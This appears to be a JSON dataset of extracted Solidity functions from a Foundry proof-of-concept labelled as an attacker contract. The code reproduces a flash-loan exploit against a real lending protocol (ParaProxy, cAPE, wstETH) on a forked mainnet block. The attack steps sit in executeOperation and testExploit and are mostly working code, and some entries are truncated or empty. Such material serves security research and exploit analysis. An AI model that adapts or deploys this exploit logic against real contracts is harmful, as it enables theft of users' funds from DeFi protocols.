[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address asset,\n        uint256 amount,\n        uint256 premium,\n        address initiator,\n        bytes calldata params\n    ) public payable returns (bool) {\n        // approve(spender, amount) -> (bool _: true)\n        _cAPE.call(abi.encodePacked(bytes4(0x095ea7b3), abi.encode(_ParaProxy, type(uint256).max)));\n\n        for (uint256 i = 0; i < 8; i++) {\n            Slave _slave = new Slave();\n            if (i == 6) {\n                // transfer(recipient, amount) -> (bool _: true)\n                _wstETH.call(\n                    abi.encodePacked(\n                        bytes4(0xa9059cbb), abi.encode(address(_slave), uint256(3_676_225_912_400_376_673_786))\n                    )\n                );\n                _slave.remove(1_120_000_000_000_000_000_000_000);\n            } else {\n                // transfer(recipient, amount) -> (bool _: true)\n                _wstETH.call(\n                    abi.encodePacked(\n                        bytes4(0xa9059cbb), abi.encode(address(_slave), uint256(6_039_513_998_943_475_964_078))\n                    )\n                );\n                _slave.remove(1_840_000_000_000_000_000_000_000);\n            }\n\n            if (i != 7) {\n                // supply(asset, amount, onBehalfOf, referralCode) -> ()\n                _ParaProxy.call(\n                    abi.encodePacked(\n                        bytes4(0x617ba037),\n                        abi.encode(_cAPE, IERC20(_cAPE).balanceOf(address(this)), address(this), uint256(0))\n                    )\n                );\n            }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 16_845_558);\n        cheats.label(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, \"_wstETH\");\n        cheats.label(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, \"_WETH\");\n        cheats.label(0xDDDe38696FBe5d11497D72d8801F651642d62353, \"_pcAPE\");\n        cheats.label(0x4d224452801ACEd8B2F0aebE155379bb5D594381, \"_APE\");\n        cheats.label(0x1B36ad30F6866716FF08EB599597D8CE7607571d, \"_vDebtUSDC\");\n        cheats.label(0xC5c9fB6223A989208Df27dCEE33fC59ff5c26fFF, \"_cAPE\");\n        cheats.label(0xCA76D6D905b08e3224945bFA0340E92CCbbE5171, \"_vDebtwstETH\");\n        cheats.label(0x87F92191e14d970f919268045A57f7bE84559CEA, \"_vDebtWETH\");\n        cheats.label(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, \"_USDC\");\n        cheats.label(0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee, \"_ParaProxy\");\n        cheats.label(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2, \"_proxy\");\n        cheats.label(0x5954aB967Bc958940b7EB73ee84797Dc8a2AFbb9, \"_Apecoin__Staking\");\n        cheats.label(0xE592427A0AEce92De3Edee1F18E0157C05861564, \"_Uniswap_V3__Router\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        emit log_named_uint(\"Before exploit, _WETH balance of Attacker:\", IERC20(_WETH).balanceOf(address(this)));\n        emit log_named_uint(\"Before exploit, _pcAPE balance of Exploit:\", IERC20(_pcAPE).balanceOf(address(this)));\n        emit log_named_uint(\n            \"Before exploit, _vDebtUSDC balance of Exploit:\", IERC20(_vDebtUSDC).balanceOf(address(this))\n        );\n        emit log_named_uint(\n            \"Before exploit, _vDebtWETH balance of Exploit:\", IERC20(_vDebtWETH).balanceOf(address(this))\n        );\n        emit log_named_uint(\"Before exploit, _cAPE balance of Exploit:\", IERC20(_cAPE).balanceOf(address(this)));\n        emit log_named_uint(\n            \"Before exploit, _vDebtwstETH balance of Exploit:\", IERC20(_vDebtwstETH).balanceOf(address(this))\n        );\n\n        // () -> ()\n        _proxy.call(\n            abi.encodePacked(\n                bytes4(0x42b0b77c),\n                abi.encode(address(this), _wstETH, uint256(47_352_823_905_004_708_422_332), new bytes(0), uint16(0))\n            )\n        );\n\n        emit log_named_uint(\"After exploit, _WETH balance of Attacker:\", IERC20(_WETH).balanceOf(address(this)));\n        emit log_named_uint(\"After exploit, _pcAPE balance of Exploit:\", IERC20(_pcAPE).balanceOf(address(this)));\n        emit log_named_uint(\n            \"After exploit, _vDebtUSDC balance of Exploit:\", IERC20(_vDebtUSDC).balanceOf(address(this))\n        );\n        emit log_named_uint(\n            \"After exploit, _vDebtWETH balance of Exploit:\", IERC20(_vDebtWETH).balanceOf(address(this))\n        );\n        emit log_named_uint(\"After exploit, _cAPE balance of Exploit:\", IERC20(_cAPE).balanceOf(address(this)));\n        emit log_named_uint(\n            \"After exploit, _vDebtwstETH balance of Exploit:\", IERC20(_vDebtwstETH).balanceOf(address(this))\n        );\n    }\n\n    struct ExactInputSingleParams {\n        address tokenIn;\n        address tokenOut;\n        uint24 fee;\n        address recipient;\n        uint256 deadline;\n        uint256 amountIn;\n        uint256 amountOutMinimum;\n        uint160 sqrtPriceLimitX96;\n    }\n\n    struct ExactOutputSingleParams {\n        address tokenIn;\n        address tokenOut;\n        uint24 fee;\n        address recipient;\n        uint256 deadline;\n        uint256 amountOut;\n        uint256 amountInMaximum;\n        uint160 sqrtPriceLimitX96;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Slave",
    "source_type": "victim_contract",
    "function_name": "remove",
    "original_code": "",
    "description": ""
  }
]